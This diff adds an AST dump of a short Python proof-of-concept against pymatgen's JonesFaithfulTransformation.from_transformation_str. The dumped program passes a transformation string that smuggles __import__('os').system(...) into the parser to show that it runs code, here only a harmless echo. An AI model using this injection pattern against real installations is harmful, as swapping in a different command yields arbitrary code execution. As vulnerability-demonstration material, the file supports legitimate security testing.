@@ -1,0 +1,23 @@
+Module(
+    body=[
+        ImportFrom(
+            module='pymatgen.transformations.standard_transformations',
+            names=[
+                alias(name='JonesFaithfulTransformation')],
+            level=0),
+        Assign(
+            targets=[
+                Name(id='transformation_str', ctx=Store())],
+            value=Constant(value="__import__('os').system('echo Vulnerable!')")),
+        Assign(
+            targets=[
+                Name(id='transformation', ctx=Store())],
+            value=Call(
+                func=Attribute(
+                    value=Name(id='JonesFaithfulTransformation', ctx=Load()),
+                    attr='from_transformation_str',
+                    ctx=Load()),
+                args=[
+                    Name(id='transformation_str', ctx=Load())],
+                keywords=[]))],
+    type_ignores=[])
